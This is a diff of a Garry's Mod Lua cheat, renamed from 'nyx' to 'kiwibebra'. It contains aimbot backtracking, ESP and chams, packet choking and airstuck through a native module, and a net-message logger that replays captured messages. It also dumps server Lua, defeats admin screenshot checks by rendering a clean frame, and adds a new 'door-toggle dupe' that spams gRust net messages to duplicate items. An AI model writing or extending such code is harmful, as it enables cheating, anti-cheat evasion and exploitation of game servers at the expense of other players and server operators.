+    if BT.ZX() then l = ded.GetLatency(0) elseif BT.NetReady() then l = kiwibebramod.Latency(0) end
     if l then return l end
     return IsValid(ply) and ply:Ping() / 2000 or 0
 end
@@ -1215,7 +2087,7 @@ end
 --   projectile: no lag compensation, and the projectile needs time to get there: lead by the time
 --     since his newest update + round trip + flight time (solved a few times over, the flight time
 --     depends on the point), plus the drop of a projectile that has gravity.
--- Updates are seen as changes of the networked origin; with gmcl_nyx their server time is the
+-- Updates are seen as changes of the networked origin; with gmcl_kiwibebra their server time is the
 -- simulation time, without it the arrival time minus the round trip. Velocity comes from two
 -- updates, not GetVelocity (for other players that's the client's own estimate, late on turns).
 -- The offset is per player (newest update -> predicted position), added to any of his hitboxes.
@@ -1513,7 +2385,7 @@ AddHook("PostDrawTranslucentRenderables", "extrap", function(depth, skybox)
 end)
 
 function BT.ModStatus()
-    if not istable(nyxmod) then return "module: not installed (lua/bin/gmcl_nyx_*.dll)" end
+    if not istable(kiwibebramod) then return "module: not installed (lua/bin/gmcl_kiwibebra_*.dll)" end
 
     local m = BT.M
     return string.format("cmd %s | net %s | netvars %s", m.cmd and "ok" or (m.cmd == false and "FAIL" or "..."),
@@ -1521,7 +2393,7 @@ function BT.ModStatus()
 end
 
 function BT.NetStatus()
-    if not istable(nyxmod) then return "module not installed" end
+    if not istable(kiwibebramod) then return "module not installed" end
     return string.sub(BT.M.netMsg, 1, 44)
 end
 
@@ -1627,7 +2499,7 @@ end
 
 -- A record whose `hitbox` is in the open from shootPos and inside fovLimit of fwd: position, the
 -- tick the shot has to carry, angle to the crosshair, distance. Which records are tried is the
--- mode (ultimate's): newest - nyx's, newest first, up to 6 spread over the window; last - only the
+-- mode (ultimate's): newest - kiwibebra's, newest first, up to 6 spread over the window; last - only the
 -- oldest hittable one ("Last ticks"); closest - only the one nearest to you; scan - every one,
 -- oldest first, until one is in the open.
 function BT.Find(ply, v, hitbox, shootPos, fwd, fovLimit)
@@ -3571,14 +4443,14 @@ do
         surface.SetDrawColor(50, 50, 50, 255)
         surface.DrawOutlinedRect(x, y, w, h, 1)
 
-        draw.SimpleText(string.format("pixel surf  %+.2fu", c.height), "NyxUIBold", x + 8, y + 5, Color(255, 255, 255))
+        draw.SimpleText(string.format("pixel surf  %+.2fu", c.height), "KiwibebraUIBold", x + 8, y + 5, Color(255, 255, 255))
 
         for i, r in ipairs(c.rows) do
             local ok = r.tick ~= nil
             local col = ok and Color(149, 184, 6) or Color(110, 110, 110)
             local ry = y + 6 + i * 15
-            draw.SimpleText(r.name, "NyxUI", x + 8, ry, col)
-            draw.SimpleText(ok and ("tick " .. r.tick) or "no", "NyxUI", x + w - 8, ry, col, TEXT_ALIGN_RIGHT)
+            draw.SimpleText(r.name, "KiwibebraUI", x + 8, ry, col)
+            draw.SimpleText(ok and ("tick " .. r.tick) or "no", "KiwibebraUI", x + w - 8, ry, col, TEXT_ALIGN_RIGHT)
         end
     end)
 
@@ -4049,7 +4921,7 @@ do
         if not why or RealTime() < (MV.skipLogAt or 0) then return end
         MV.skipLogAt = RealTime() + 0.5
 
-        MsgC(sp and Color(149, 184, 6) or Color(255, 140, 60), "[nyx edgeskip] ",
+        MsgC(sp and Color(149, 184, 6) or Color(255, 140, 60), "[kiwibebra edgeskip] ",
             Color(220, 220, 220), string.format(
                 "edge in %d ticks at %d u/s: %d tried, %d land on the lip, %d of them stop, %d land elsewhere%s\n",
                 why.k, why.speed, why.tried, why.lip, why.stops, why.other,
@@ -4421,29 +5293,7 @@ do
             end
         end
 
-        if not m.ebIndicator then return end
-
-        local age = CurTime() - MV.flash
-        if age > 1.2 then return end
-
-        local a = 255 * (1 - age / 1.2)
-        local y = ScrH() / 2 + 60 - age * 12
-
-        local tb = MV.flashText == "texturebug"
-        local col = tb and Color(90, 200, 255, a) or Color(149, 184, 6, a)
-
-        -- while still hanging, how long so far
-        local text = MV.flashText
-        if tb and MV.atRun >= MV.tbMinHold then
-            text = string.format("%s %.1fs", cfg.move.wallhang and "wallhang" or "texturebug",
-                CurTime() - MV.runStart)
-        end
-
-        draw.SimpleTextOutlined(text, "NyxKillFxSmall", ScrW() / 2, y, col,
-            TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, a))
-        local count = tb and MV.tbHits or (MV.flashText == "edgeskip" and MV.esHits or MV.hits)
-        draw.SimpleTextOutlined("x" .. count, "NyxESP", ScrW() / 2, y + 14, Color(225, 225, 225, a),
-            TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, a))
+        -- (the "edgebug / texturebug / wallhang / edgeskip xN" pop-up under the crosshair is gone)
     end)
 end
 
@@ -5584,9 +6434,9 @@ do
         end
 
         if BT.NetReady() then
-            local held, holdMax = nyxmod.Held()
+            local held, holdMax = kiwibebramod.Held()
             if held > 0 then return string.format("module: airstuck %d / %d ticks", held, holdMax) end
-            return string.format("module: choked %d  (limit %d)", nyxmod.Choked(), MV.modChoke or 0)
+            return string.format("module: choked %d  (limit %d)", kiwibebramod.Choked(), MV.modChoke or 0)
         end
 
         if not applied then return "off (cl_cmdrate untouched)" end
@@ -5618,7 +6468,7 @@ do
             if aa.enabled and aa.desync and choke < 1 then choke = 1 end
 
             MV.modChoke = choke
-            if BT.ZX() then BT.zchoke = choke else nyxmod.SetChoke(choke) end
+            if BT.ZX() then BT.zchoke = choke else kiwibebramod.SetChoke(choke) end
 
             local wants = choke > 0 or cfg.move.airstuck
             SetRate(wants and math.floor(1 / engine.TickInterval() + 0.5) or nil)
@@ -5851,19 +6701,34 @@ function BAG.NetRun(ply)
     end
 end
 
--- nyx_interact_burst [n]: one burst at whatever you are looking at, any class (for testing)
-concommand.Add("nyx_interact_burst", function(ply, cmd, args)
+-- door-toggle dupe
+hook.Add("PlayerButtonDown", "😂😂😂🤣🤣🤣🤣🤣🤣🙂🙂🙂🙂", function(ply, button)
+    if not cfg.bagspam.doorDupe then return end
+    if button == KEY_V then
+        for _, bag in pairs(ents.FindByClass("rust_itembag")) do
+            if IsValid(bag) then
+                net.Start("gRust.ToggleDoor")
+                    net.WriteEntity(bag)
+                net.SendToServer()
+            end
+        end
+    end
+end)
+addedHooks[#addedHooks + 1] = {"PlayerButtonDown", "😂😂😂🤣🤣🤣🤣🤣🤣🙂🙂🙂🙂"}
+
+-- kiwibebra_interact_burst [n]: one burst at whatever you are looking at, any class (for testing)
+concommand.Add("kiwibebra_interact_burst", function(ply, cmd, args)
     local me = LocalPlayer()
     if not IsValid(me) then return end
 
     local ent = me:GetEyeTrace().Entity
     if not BAG.CanInteract(me, ent) then
-        print("[nyx] nothing interactable in reach under the crosshair")
+        print("[kiwibebra] nothing interactable in reach under the crosshair")
         return
     end
 
     BAG.Burst(ent, math.Clamp(tonumber(args[1]) or math.floor(cfg.bagspam.netCount), 1, 50))
-    print("[nyx] " .. BAG.netStatus)
+    print("[kiwibebra] " .. BAG.netStatus)
 end)
 
 function BAG.Status()
@@ -5930,12 +6795,12 @@ function BAG.Run(cmd, ply)
     return b.aim
 end
 
-concommand.Add("nyx_bag_class", function(ply, cmd, args)
+concommand.Add("kiwibebra_bag_class", function(ply, cmd, args)
     if args[1] and args[1] ~= "" then
         cfg.bagspam.class = args[1]
-        print("[nyx] item bag class: " .. args[1])
+        print("[kiwibebra] item bag class: " .. args[1])
     else
-        print("[nyx] item bag class: " .. cfg.bagspam.class .. "   (nyx_bag_class <class>)")
+        print("[kiwibebra] item bag class: " .. cfg.bagspam.class .. "   (kiwibebra_bag_class <class>)")
     end
 end)
 
@@ -5945,7 +6810,7 @@ end)
 -- + line that called net.Start. That shows what a gamemode's menu really sends, e.g. when an item
 -- is taken out of a bag. Incoming messages get the same from the other side: every net.Read* the
 -- receiver does, with what it returned. Any sent record can be copied as a ready-to-run Lua
--- snippet or sent again value for value (replay), from the log window (nyx_net_menu) or console.
+-- snippet or sent again value for value (replay), from the log window (kiwibebra_net_menu) or console.
 -- The net functions are only wrapped while the logger is on. Lua Write* / Read* functions that
 -- call other ones inside (WriteTable, WriteEntity, WriteType) are recorded once, at the outermost
 -- call, so a replay calls the same function. Code that cached a function at load time
@@ -6147,7 +7012,7 @@ local function Build()
 
         if cfg.netlog.print then
             local col = m.dir == "in" and Color(90, 200, 255) or (m.dir == "mark" and Color(255, 220, 60) or Color(149, 184, 6))
-            MsgC(col, "[nyx net] ", Color(225, 225, 225), NETLOG.Format(m), "\n")
+            MsgC(col, "[kiwibebra net] ", Color(225, 225, 225), NETLOG.Format(m), "\n")
         end
     end
 
@@ -6264,7 +7129,7 @@ local function Build()
                 curIn = nil
 
                 if rec then Push(rec) end
-                if not ok then ErrorNoHalt("[nyx net] receiver of " .. name .. " errored: " .. tostring(err) .. "\n") end
+                if not ok then ErrorNoHalt("[kiwibebra net] receiver of " .. name .. " errored: " .. tostring(err) .. "\n") end
             end
         end
     end
@@ -6305,7 +7170,7 @@ local function Build()
 
         replayOf = nil
         local msg = ok and string.format("sent %s x%d", m.name, times) or tostring(err)
-        print("[nyx net] replay #" .. m.id .. ": " .. msg)
+        print("[kiwibebra net] replay #" .. m.id .. ": " .. msg)
         return ok, msg
     end
 
@@ -6316,7 +7181,7 @@ local function Build()
             local m = list[i]
             if m.dir == "out" and not string.find(m.src or "", "^replay") then return NETLOG.Replay(m, 1) end
         end
-        print("[nyx net] nothing sent yet")
+        print("[kiwibebra net] nothing sent yet")
     end
 
     function NETLOG.Mark()
@@ -6328,7 +7193,7 @@ local function Build()
         local list = NETLOG.list
         n = math.min(n or 40, #list)
 
-        print(string.format("[nyx net] last %d of %d:", n, NETLOG.count))
+        print(string.format("[kiwibebra net] last %d of %d:", n, NETLOG.count))
         for i = #list - n + 1, #list do print(NETLOG.Format(list[i])) end
     end
 
@@ -6347,15 +7212,15 @@ local function Build()
             if m.dir ~= "mark" then out[#out + 1] = "    " .. string.gsub(NETLOG.ToLua(m), "\n", "\n    ") end
         end
 
-        file.CreateDir("nyx")
-        file.Write("nyx/netlog.txt", table.concat(out, "\n"))
-        print("[nyx net] saved " .. #NETLOG.list .. " records to data/nyx/netlog.txt")
+        file.CreateDir("kiwibebra")
+        file.Write("kiwibebra/netlog.txt", table.concat(out, "\n"))
+        print("[kiwibebra net] saved " .. #NETLOG.list .. " records to data/kiwibebra/netlog.txt")
     end
 
     function NETLOG.ToggleIgnore(name)
         local k = string.lower(name)
         ignore[k] = not ignore[k] or nil
-        print("[nyx net] " .. name .. (ignore[k] and " ignored" or " logged again"))
+        print("[kiwibebra net] " .. name .. (ignore[k] and " ignored" or " logged again"))
     end
 
     -- the name of the newest message that isn't a marker goes on the ignore list
@@ -6364,7 +7229,7 @@ local function Build()
             local m = NETLOG.list[i]
             if m.dir ~= "mark" then
                 ignore[string.lower(m.name)] = true
-                print("[nyx net] ignoring " .. m.name)
+                print("[kiwibebra net] ignoring " .. m.name)
                 return
             end
         end
@@ -6380,7 +7245,7 @@ local function Build()
 
     -- log window ---------------------------------------------------------------------
     -- A Derma frame of its own (the skeet menu is for settings): the list on top, the selected
-    -- record below with its Lua form, replay / copy / ignore buttons. Opens with nyx_net_menu or
+    -- record below with its Lua form, replay / copy / ignore buttons. Opens with kiwibebra_net_menu or
     -- the button in Misc > Net logger.
 
     local COL = {
@@ -6526,7 +7391,7 @@ local function Build()
         local f = vgui.Create("DFrame")
         f:SetSize(math.min(ScrW() - 40, 1100), math.min(ScrH() - 40, 680))
         f:Center()
-        f:SetTitle("nyx  -  net log")
+        f:SetTitle("kiwibebra  -  net log")
         f:SetSizable(true)
         f:SetDeleteOnClose(false)
         f:MakePopup()
@@ -6665,33 +7530,33 @@ local function Build()
         if IsValid(W.frame) then W.frame:Remove() end
     end
 
-    concommand.Add("nyx_net_menu", NETLOG.ToggleWindow)
-    concommand.Add("nyx_net_dump", function(ply, cmd, args) NETLOG.Dump(tonumber(args[1])) end)
-    concommand.Add("nyx_net_clear", function() NETLOG.Clear() end)
-    concommand.Add("nyx_net_save", function() NETLOG.Save() end)
-    concommand.Add("nyx_net_mark", function() NETLOG.Mark() end)
+    concommand.Add("kiwibebra_net_menu", NETLOG.ToggleWindow)
+    concommand.Add("kiwibebra_net_dump", function(ply, cmd, args) NETLOG.Dump(tonumber(args[1])) end)
+    concommand.Add("kiwibebra_net_clear", function() NETLOG.Clear() end)
+    concommand.Add("kiwibebra_net_save", function() NETLOG.Save() end)
+    concommand.Add("kiwibebra_net_mark", function() NETLOG.Mark() end)
 
-    -- nyx_net_replay <id> [times]: the id is the # in the log
-    concommand.Add("nyx_net_replay", function(ply, cmd, args)
+    -- kiwibebra_net_replay <id> [times]: the id is the # in the log
+    concommand.Add("kiwibebra_net_replay", function(ply, cmd, args)
         local m = NETLOG.Find(tonumber(args[1] or ""))
-        if not m then print("[nyx net] no record #" .. tostring(args[1])) return end
+        if not m then print("[kiwibebra net] no record #" .. tostring(args[1])) return end
         NETLOG.Replay(m, tonumber(args[2]))
     end)
 
-    -- nyx_net_lua <id>: prints the record as Lua and copies it
-    concommand.Add("nyx_net_lua", function(ply, cmd, args)
+    -- kiwibebra_net_lua <id>: prints the record as Lua and copies it
+    concommand.Add("kiwibebra_net_lua", function(ply, cmd, args)
         local m = NETLOG.Find(tonumber(args[1] or ""))
-        if not m then print("[nyx net] no record #" .. tostring(args[1])) return end
+        if not m then print("[kiwibebra net] no record #" .. tostring(args[1])) return end
         print(NETLOG.ToLua(m))
         SetClipboardText(NETLOG.ToLua(m))
     end)
 
-    -- nyx_net_ignore <name>: toggles a name on the ignore list; no name lists it
-    concommand.Add("nyx_net_ignore", function(ply, cmd, args)
+    -- kiwibebra_net_ignore <name>: toggles a name on the ignore list; no name lists it
+    concommand.Add("kiwibebra_net_ignore", function(ply, cmd, args)
         local name = args[1]
 
         if not name or name == "" then
-            print("[nyx net] ignored: " .. table.concat(table.GetKeys(ignore), ", "))
+            print("[kiwibebra net] ignored: " .. table.concat(table.GetKeys(ignore), ", "))
             return
         end
 
@@ -6702,14 +7567,14 @@ Build()
 end
 
 -- lua dump ---------------------------------------------------------------------
--- Copies the source of client Lua files the server sent (gamemode, addons) into data/nyx/dump/,
+-- Copies the source of client Lua files the server sent (gamemode, addons) into data/kiwibebra/dump/,
 -- to read them outside the game. The path can be given the way debug info prints it
 -- (gamemodes/rust/gamemode/x.lua) or relative to lua/ (rust/gamemode/x.lua); several search
 -- paths are tried, since the files can come from the server's download or a local copy.
---   nyx_dump_lua <file>          one file
---   nyx_dump_lua_dir <folder>    every .lua under the folder, recursively
+--   kiwibebra_dump_lua <file>          one file
+--   kiwibebra_dump_lua_dir <folder>    every .lua under the folder, recursively
 do
-    local OUT = "nyx/dump"
+    local OUT = "kiwibebra/dump"
 
     -- relative path variants x search paths, in the order they are tried
     local function Candidates(path)
@@ -6736,30 +7601,30 @@ do
         local name = string.gsub(string.gsub(path, "^gamemodes/", ""), "[^%w_%-%.]", "_")
         name = string.gsub(name, "%.lua$", "") .. ".txt"
 
-        file.CreateDir("nyx")
+        file.CreateDir("kiwibebra")
         file.CreateDir(OUT)
         file.Write(OUT .. "/" .. name, src)
 
         return "data/" .. OUT .. "/" .. name
     end
 
-    concommand.Add("nyx_dump_lua", function(ply, cmd, args, argStr)
+    concommand.Add("kiwibebra_dump_lua", function(ply, cmd, args, argStr)
         local path = string.Trim(argStr or "")
-        if path == "" then print("usage: nyx_dump_lua <path to a .lua file>") return end
+        if path == "" then print("usage: kiwibebra_dump_lua <path to a .lua file>") return end
 
         local src, from = ReadLua(path)
         if not src then
-            print("[nyx dump] not readable: " .. path .. "  (tried LUA, lsv, lcl, GAME)")
+            print("[kiwibebra dump] not readable: " .. path .. "  (tried LUA, lsv, lcl, GAME)")
             return
         end
 
-        print(string.format("[nyx dump] %s  (%d bytes, %s) -> %s", path, #src, from, Save(path, src)))
+        print(string.format("[kiwibebra dump] %s  (%d bytes, %s) -> %s", path, #src, from, Save(path, src)))
     end)
 
     -- every .lua under dir, found through the first search path that lists anything
-    concommand.Add("nyx_dump_lua_dir", function(ply, cmd, args, argStr)
+    concommand.Add("kiwibebra_dump_lua_dir", function(ply, cmd, args, argStr)
         local dir = string.gsub(string.Trim(argStr or ""), "/+$", "")
-        if dir == "" then print("usage: nyx_dump_lua_dir <folder>") return end
+        if dir == "" then print("usage: kiwibebra_dump_lua_dir <folder>") return end
 
         local saved, failed = 0, 0
 
@@ -6792,13 +7657,13 @@ do
             Walk(base, 0)
 
             if found then
-                print(string.format("[nyx dump] %s via %s: %d saved, %d unreadable -> data/%s/",
+                print(string.format("[kiwibebra dump] %s via %s: %d saved, %d unreadable -> data/%s/",
                     base, c[2], saved, failed, OUT))
                 return
             end
         end
 
-        print("[nyx dump] nothing found under " .. dir)
+        print("[kiwibebra dump] nothing found under " .. dir)
     end)
 end
 
@@ -6824,7 +7689,7 @@ local function MainMove(cmd)
     if BT.NetReady() and not BT.ZX() then
         local stuck = cfg.move.airstuck and ply:Alive()
         if stuck ~= BT.M.stuck then
-            nyxmod.SetHold(stuck, math.floor(math.Clamp(cfg.move.asMax, 0.2, 20) / engine.TickInterval()))
+            kiwibebramod.SetHold(stuck, math.floor(math.Clamp(cfg.move.asMax, 0.2, 20) / engine.TickInterval()))
             BT.M.stuck = stuck
         end
 
@@ -6891,6 +7756,10 @@ BT.zapplied = {}
 BT.animSim = setmetatable({}, {__mode = "k"})
 
 AddHook("Think", "zxcmodule", function()
+    -- the rage aimbot always runs with zxcmodule: enabling it switches "Use zxcmodule" on (and
+    -- keeps it on while it is enabled); it can be turned off again once rage is off
+    if cfg.rage.enabled then cfg.zx.enabled = true end
+
     if not istable(ded) then return end
 
     local on = cfg.zx.enabled
@@ -7103,9 +7972,9 @@ AddHook("CalcViewModelView", "viewmodel", function(wep, vm, oldPos, oldAng, pos,
     local vmc = cfg.vm
 
     -- an earlier version wrote vmc.fov into SWEP.ViewModelFOV; put such a weapon back once
-    if IsValid(wep) and wep.nyxVMSaved then
-        if wep.nyxVMFov then wep.ViewModelFOV = wep.nyxVMFov end
-        wep.nyxVMSaved = nil
+    if IsValid(wep) and wep.kiwibebraVMSaved then
+        if wep.kiwibebraVMFov then wep.ViewModelFOV = wep.kiwibebraVMFov end
+        wep.kiwibebraVMSaved = nil
     end
 
     local changed = false
@@ -7141,9 +8010,17 @@ end)
 
 local ssHidden = false          -- true while a clean frame is being produced
 
--- one table instead of new locals (the chunk is at 200)
+-- screengrab alert: every capture is counted, its picture saved to data/kiwibebra/grabs/ and shown
+-- in a corner with a shutter sound. One table instead of new locals (the chunk is at 200).
 local SSG = {
     hidden  = 0,                -- captures that got the clean frame
+    grabs   = 0,                -- captures seen at all
+    mat     = nil,              -- the latest grab as a material
+    file    = "",
+    src     = "",               -- Lua file:line that called the capture
+    time    = -100,             -- RealTime() of the latest grab
+    soundAt = 0,
+    SHOW    = 6,                -- seconds the preview stays
 }
 
 -- night mode / sky changes live in material parameters, so a grab needs them put back and
@@ -7201,8 +8078,61 @@ local function RenderCleanFrame()
     pcall(render.RenderView, view)
 end
 
+-- file:line of whoever called the wrapper (level 1 = this, 2 = the wrapper, 3 = the caller)
+function SSG.Caller()
+    local info = debug.getinfo(3, "Sl")
+    if not info then return "?" end
+    return (info.short_src or "?") .. ":" .. (info.currentline or 0)
+end
+
+-- A grab happened. data is what the server's tool got (render.Capture), or nil for
+-- render.CapturePixels: then the framebuffer is still the one it read, so it is captured again
+-- here with the original function (no recursion, nothing reaches the server).
+function SSG.Notify(data, params, src)
+    local m = cfg.misc
+    if not m.ssAlert then return end
+
+    SSG.grabs = SSG.grabs + 1
+
+    local ext = "jpg"
+    if data then
+        if istable(params) and params.format == "png" then ext = "png" end
+    else
+        local ok, d = pcall(origCapture, {format = "jpeg", quality = 80, x = 0, y = 0, w = ScrW(), h = ScrH()})
+        data = ok and d or nil
+    end
+
+    if m.ssPreview and data and #data > 0 then
+        file.CreateDir("kiwibebra/grabs")
+        local name = os.date("%Y%m%d_%H%M%S") .. "_" .. SSG.grabs .. "." .. ext
+        file.Write("kiwibebra/grabs/" .. name, data)
+
+        -- unique name per grab: Material() caches by path
+        local mat = Material("../data/kiwibebra/grabs/" .. name, "smooth")
+        SSG.mat = (mat and not mat:IsError()) and mat or nil
+        SSG.file = "data/kiwibebra/grabs/" .. name
+    end
+
+    SSG.src, SSG.time = src, RealTime()
+
+    -- some tools capture in bursts; one shutter per half second
+    if m.ssSound and RealTime() - SSG.soundAt > 0.5 then
+        SSG.soundAt = RealTime()
+        surface.PlaySound("npc/scanner/scanner_photo1.wav")
+    end
+
+    MsgC(Color(255, 80, 80), "[kiwibebra] screengrab ", color_white, "#" .. SSG.grabs .. " from " .. src
+        .. (SSG.file ~= "" and ("  ->  " .. SSG.file) or "") .. "\n")
+end
+
 render.Capture = function(...)
-    if not cfg.misc.antiSS then return origCapture(...) end
+    local src = SSG.Caller()
+
+    if not cfg.misc.antiSS then
+        local data = origCapture(...)
+        SSG.Notify(data, (...), src)
+        return data
+    end
 
     RenderCleanFrame()
     local ok, data = pcall(origCapture, ...)
@@ -7210,25 +8140,63 @@ render.Capture = function(...)
     WorldMaterialsRestore()
 
     if not ok then error(data, 0) end
+    SSG.Notify(data, (...), src)
     return data
 end
 
 render.CapturePixels = function(...)
-    if not cfg.misc.antiSS then return origCapturePixels(...) end
+    local src = SSG.Caller()
+
+    if not cfg.misc.antiSS then
+        origCapturePixels(...)
+        SSG.Notify(nil, nil, src)
+        return
+    end
 
     RenderCleanFrame()
     local ok, err = pcall(origCapturePixels, ...)
+
+    -- re-capture before the world looks get re-applied: the framebuffer still holds the clean frame
+    if ok then SSG.Notify(nil, nil, src) end
+
     ssHidden = false
     WorldMaterialsRestore()
 
     if not ok then error(err, 0) end
 end
 
+-- the latest grab in the top right corner, fading out; never part of a clean frame
+AddHook("HUDPaint", "ssgrab", function()
+    if IsHidden() or not cfg.misc.ssAlert then return end
+
+    local age = RealTime() - SSG.time
+    if age > SSG.SHOW then return end
+
+    local a = math.Clamp((SSG.SHOW - age) / 0.6, 0, 1) * 255
+    local w = 320
+    local h = SSG.mat and math.floor(w * ScrH() / ScrW()) or 0
+    local x, y = ScrW() - w - 16, 16
+
+    surface.SetDrawColor(15, 15, 15, a * 0.9)
+    surface.DrawRect(x - 4, y - 4, w + 8, h + 46)
+    surface.SetDrawColor(255, 70, 70, a)
+    surface.DrawOutlinedRect(x - 4, y - 4, w + 8, h + 46)
+
+    draw.SimpleText("SCREENGRAB  #" .. SSG.grabs, "DermaDefaultBold", x, y, Color(255, 80, 80, a))
+    draw.SimpleText(SSG.src, "DermaDefault", x, y + 16, Color(220, 220, 220, a))
+
+    if SSG.mat then
+        surface.SetDrawColor(255, 255, 255, a)
+        surface.SetMaterial(SSG.mat)
+        surface.DrawTexturedRect(x, y + 36, w, h)
+    end
+end)
+
 -- ---------------------------------------------------------------------------
 -- ESP
 -- ---------------------------------------------------------------------------
 
-surface.CreateFont("NyxESP", {
+surface.CreateFont("KiwibebraESP", {
     font = "Verdana",
     size = 12,
     weight = 500,
@@ -7301,7 +8269,7 @@ local ESPL = {
     },
     LEGACY = {box = "box", name = "name", hpbar = "health", hp = "hpText", weapon = "weapon", distance = "distance"},
     FAKE = {
-        name = "nyx", hpbar = 0.76, hp = "76", hpFrac = 0.76, armorbar = 0.5, armor = "50 ar",
+        name = "kiwibebra", hpbar = 0.76, hp = "76", hpFrac = 0.76, armorbar = 0.5, armor = "50 ar",
         weapon = "AK-47", ammo = "24 / 90", ammobar = 0.8, distance = "12m", job = "Citizen",
         group = "admin", ping = "35ms", money = "$12,500", flags = {"duck", "target"},
     },
@@ -7405,14 +8373,14 @@ end
 function ESPL.Draw(x, y, w, h, d, base, outline, hits)
     local sides = ESPL.Sides()
     local LH = 12
-    surface.SetFont("NyxESP")
+    surface.SetFont("KiwibebraESP")
 
     local function Rec(id, rx, ry, rw, rh)
         if hits then hits[id] = {x = rx, y = ry, w = rw, h = rh} end
     end
 
     local function Text(s, tx, ty, col, ax, ay)
-        draw.SimpleTextOutlined(s, "NyxESP", tx, ty, col, ax, ay, 1, outline)
+        draw.SimpleTextOutlined(s, "KiwibebraESP", tx, ty, col, ax, ay, 1, outline)
         return surface.GetTextSize(s)
     end
 
@@ -7588,7 +8556,7 @@ local function GetWorldList(me)
 end
 
 -- Custom entity names (Entities tab: right-click > Rename), key -> name; kept on MV because the
--- Entities tab further down and the ESP here both read it. Saved in data/nyx/entities.json.
+-- Entities tab further down and the ESP here both read it. Saved in data/kiwibebra/entities.json.
 MV.entNames = MV.entNames or {}
 
 -- What makes two entities "the same kind": the class, plus the model when the class alone says
@@ -8226,7 +9194,7 @@ do
 
     local function Made(name, shader, params)
         params["$model"] = 1
-        return CreateMaterial("nyx_cham_" .. name, shader, params)
+        return CreateMaterial("kiwibebra_cham_" .. name, shader, params)
     end
 
     local defs = {
@@ -8250,25 +9218,25 @@ do
         --    multiplied with textures that are teal: red came out nearly black. $color evens the
         --    channels out (texture's luminance / its average per channel, from the .vtf headers'
         --    reflectivity), so texture x $color is grey-ish and the modulation gives the hue.
-        {"shield",    "Shield",      Made("nyx_shield2", "Refract", {
+        {"shield",    "Shield",      Made("kiwibebra_shield2", "Refract", {
             ["$nocull"] = 1, ["$nowritez"] = 1, ["$bluramount"] = 1, ["$refractamount"] = ".02",
             ["$dudvmap"] = "models/shadertest/shader3_dudv", ["$normalmap"] = "models/shadertest/shader3_normal",
             ["$envmap"] = "env_cubemap", ["$envmaptint"] = "[.1 .1 .2]", ["$refracttint"] = "[1 1 1]",
             Proxies = {TextureScroll = {texturescrollvar = "$bumptransform", texturescrollrate = 0.08, texturescrollangle = 90}},
         }), nil, "refract"},
-        {"energy",    "Energy ball", Made("nyx_energy2", "UnlitGeneric", {
+        {"energy",    "Energy ball", Made("kiwibebra_energy2", "UnlitGeneric", {
             ["$basetexture"] = "models/effects/comball_sphere", ["$additive"] = 1, ["$translucent"] = 1,
             ["$color"] = "[1.45 0.72 1.24]",
             Proxies = {TextureScroll = {texturescrollvar = "$basetexturetransform", texturescrollrate = 1, texturescrollangle = -80}},
         })},
-        {"portal",    "Portal",      Made("nyx_portal2", "UnlitTwoTexture", {
+        {"portal",    "Portal",      Made("kiwibebra_portal2", "UnlitTwoTexture", {
             ["$basetexture"] = "models/props_combine/portalball001_sheet",
             ["$texture2"] = "models/props_combine/portalball001b_sheet",
             ["$nocull"] = 1, ["$additive"] = 1, ["$color"] = "[2.5 0.72 0.83]",
             Proxies = {TextureScroll = {texturescrollvar = "$texture2transform", texturescrollrate = -0.2, texturescrollangle = 60}},
         })},
         {"warp",      "Warp",        Material("models/props_lab/warp_sheet")},
-        {"crystal",   "Crystal",     Made("nyx_crystal2", "Refract", {
+        {"crystal",   "Crystal",     Made("kiwibebra_crystal2", "Refract", {
             ["$refractamount"] = ".05", ["$scale"] = "[1 1]",
             ["$dudvmap"] = "models/props_lab/xencrystal_dudv", ["$normalmap"] = "models/props_lab/xencrystal_normal",
             ["$envmap"] = "env_cubemap", ["$envmapcontrast"] = 1, ["$envmapsaturation"] = "[1 1 1]",
@@ -8287,24 +9255,33 @@ do
         -- sides go deep, lit sides bright), a soft gloss from phong + the map's cubemap, and only
         -- a little self-illumination so the darkest parts never turn pure black.
         -- (phong needs a bump map in this shader: a flat one)
-        {"selfillum", "Self-illum",  Made("nyx_selfillum3", "VertexLitGeneric", {
+        {"selfillum", "Self-illum",  Made("kiwibebra_selfillum3", "VertexLitGeneric", {
             ["$basetexture"] = "vgui/white", ["$bumpmap"] = "dev/flat_normal",
             ["$selfillum"] = 1, ["$selfillumtint"] = "[0.12 0.12 0.12]",
             ["$phong"] = 1, ["$phongexponent"] = 12, ["$phongboost"] = 1.5,
             ["$phongfresnelranges"] = "[0.3 0.6 1]",
             ["$envmap"] = "env_cubemap", ["$envmaptint"] = "[0.12 0.12 0.12]",
         }), true, 0.12},
-        {"selfillumglow", "Self-illum glow", Made("nyx_selfillumglow2", "VertexLitGeneric", {
+        {"selfillumglow", "Self-illum glow", Made("kiwibebra_selfillumglow2", "VertexLitGeneric", {
             ["$basetexture"] = "vgui/white", ["$selfillum"] = 1, ["$selfillumtint"] = "[0.6 0.6 0.6]",
         }), true, 0.6},
-        {"selfillumfull", "Self-illum full", Made("nyx_selfillumfull2", "VertexLitGeneric", {
+        {"selfillumfull", "Self-illum full", Made("kiwibebra_selfillumfull2", "VertexLitGeneric", {
             ["$basetexture"] = "vgui/white", ["$selfillum"] = 1, ["$selfillumtint"] = "[1 1 1]",
         }), true, 1},
         -- the glow only toward the silhouette: $selfillumfresnel (needs a bump map, a flat one here)
-        {"selfillumrim", "Self-illum rim", Made("nyx_selfillumrim2", "VertexLitGeneric", {
+        {"selfillumrim", "Self-illum rim", Made("kiwibebra_selfillumrim2", "VertexLitGeneric", {
             ["$basetexture"] = "vgui/white", ["$bumpmap"] = "dev/flat_normal",
             ["$selfillum"] = 1, ["$selfillumfresnel"] = 1, ["$selfillumfresnelminmaxexp"] = "[0 1 1.5]",
             ["$selfillumtint"] = "[1 1 1]",
+        }), true, 1},
+        -- fresnel glow: the edges light up toward the silhouette (a tight [0 0.3 0.6] curve), the
+        -- middle keeps the colour shaded by the world. $selfillumtint starts black here; it is the
+        -- chams colour, written per draw by MV.ChamTint like the other selfillum looks.
+        {"fresnel", "Fresnel glow", Made("kiwibebra_selfillum_fresnel", "VertexLitGeneric", {
+            ["$basetexture"] = "vgui/white_additive", ["$bumpmap"] = "vgui/white_additive",
+            ["$nocull"] = "0", ["$selfillum"] = 1,
+            ["$selfIllumFresnel"] = 1, ["$selfIllumFresnelMinMaxExp"] = "[0 0.3 0.6]",
+            ["$selfillumtint"] = "[0 0 0]",
         }), true, 1},
     }
 
